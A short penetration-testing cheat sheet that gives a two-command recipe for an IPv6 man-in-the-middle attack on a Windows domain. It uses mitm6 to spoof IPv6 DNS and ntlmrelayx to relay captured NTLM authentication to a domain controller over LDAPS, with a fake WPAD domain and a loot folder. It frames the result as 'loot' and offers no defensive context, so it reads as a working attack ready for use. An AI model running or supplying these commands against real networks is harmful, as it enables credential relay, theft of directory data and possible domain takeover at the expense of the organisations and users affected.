### Essentially, we become Man-in-the-Middle using IPv6

## Tools: mitm6, ntlmrelayx

## Steps: 

#### 1) sudo mitm6 -d DOMAIN

#### 2) ntlmrelayx.py -6 -t ldaps://DC_IP -wh FAKE.DOMAIN -l FOLDER (Run this first!)

#### 3) Enjoy your loot! (Enumerates EVERYTHING that tries to authenticate against the target)
